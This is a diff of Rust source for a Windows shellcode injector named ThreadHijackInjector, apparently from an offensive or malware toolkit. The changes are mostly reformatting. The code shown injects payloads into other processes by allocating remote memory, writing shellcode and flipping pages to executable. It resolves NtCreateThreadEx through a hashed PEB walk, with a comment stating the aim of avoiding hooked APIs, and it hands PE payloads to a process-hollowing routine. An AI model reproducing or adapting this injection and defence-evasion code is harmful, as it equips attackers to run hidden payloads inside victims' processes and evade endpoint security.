@@ -1,5 +1,5 @@
-use anyhow::{anyhow, Result};
 use crate::injection::Injector;
+use anyhow::{anyhow, Result};
 
 pub struct ThreadHijackInjector;
 
@@ -18,32 +18,43 @@ impl Injector for ThreadHijackInjector {
     /// directly at the shellcode.  The target process's other threads are never
     /// touched, eliminating the return assumption entirely.
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::processthreadsapi::{OpenProcess, FlushInstructionCache};
-        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION};
-        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::handleapi::CloseHandle;
+        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+        use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+        use winapi::um::winnt::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_WRITE,
+        };
 
         let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
         if is_pe {
-            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
+            log::info!(
+                "PE payload detected, forwarding to process hollowing's inject_into_process"
+            );
             return match hollowing::windows_impl::inject_into_process(pid, payload) {
                 Ok(_) => Ok(()),
-                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
+                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
             };
         }
 
         unsafe {
             let h_proc = OpenProcess(
-                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
-                0, pid,
+                PROCESS_VM_OPERATION
+                    | PROCESS_VM_WRITE
+                    | PROCESS_CREATE_THREAD
+                    | PROCESS_QUERY_INFORMATION,
+                0,
+                pid,
             );
-            if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }
+            if h_proc.is_null() {
+                return Err(anyhow!("Failed to open process"));
+            }
 
             // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread.
-            let ntdll_base = pe_resolve::get_module_handle_by_hash(
-                pe_resolve::hash_str(b"ntdll.dll\0"),
-            ).unwrap_or(0);
+            let ntdll_base =
+                pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+                    .unwrap_or(0);
             if ntdll_base == 0 {
                 CloseHandle(h_proc);
                 return Err(anyhow!("ThreadHijackInjector: ntdll not found in PEB"));
@@ -60,35 +71,70 @@ impl Injector for ThreadHijackInjector {
                 }
             };
             type NtCreateThreadExFn = unsafe extern "system" fn(
-                *mut *mut std::os::raw::c_void, u32, *mut std::os::raw::c_void,
-                *mut std::os::raw::c_void, *mut std::os::raw::c_void,
-                *mut std::os::raw::c_void, u32, usize, usize, usize,
+                *mut *mut std::os::raw::c_void,
+                u32,
+                *mut std::os::raw::c_void,
+                *mut std::os::raw::c_void,
+                *mut std::os::raw::c_void,
+                *mut std::os::raw::c_void,
+                u32,
+                usize,
+                usize,
+                usize,
                 *mut std::os::raw::c_void,
             ) -> i32;
             let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);
 
             // Allocate RW memory, write shellcode, then flip to RX.
-            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            let remote_mem = VirtualAllocEx(
+                h_proc,
+                std::ptr::null_mut(),
+                payload.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE,
+            );
             if remote_mem.is_null() {
                 CloseHandle(h_proc);
                 return Err(anyhow!("VirtualAllocEx failed"));
             }
 
             let mut written = 0usize;
-            if WriteProcessMemory(h_proc, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
+            if WriteProcessMemory(
+                h_proc,
+                remote_mem,
+                payload.as_ptr() as _,
+                payload.len(),
+                &mut written,
+            ) == 0
+            {
                 CloseHandle(h_proc);
                 return Err(anyhow!("WriteProcessMemory failed"));
             }
 
             let mut old_prot = 0u32;
-            VirtualProtectEx(h_proc, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
+            VirtualProtectEx(
+                h_proc,
+                remote_mem,
+                payload.len(),
+                PAGE_EXECUTE_READ,
+                &mut old_prot,
+            );
             // Flush I-cache before creating the new thread.
             FlushInstructionCache(h_proc, remote_mem, payload.len());
 
             let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
             let status = nt_create_thread(
-                &mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc,
-                remote_mem, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut(),
+                &mut h_thread,
+                0x1FFFFF,
+                std::ptr::null_mut(),
+                h_proc,
+                remote_mem,
+                std::ptr::null_mut(),
+                0,
+                0,
+                0,
+                0,
+                std::ptr::null_mut(),
             );
             if status < 0 || h_thread.is_null() {
                 CloseHandle(h_proc);
@@ -108,4 +154,3 @@ impl Injector for ThreadHijackInjector {
         Err(anyhow!("Thread Hijacking only supported on Windows"))
     }
 }
-
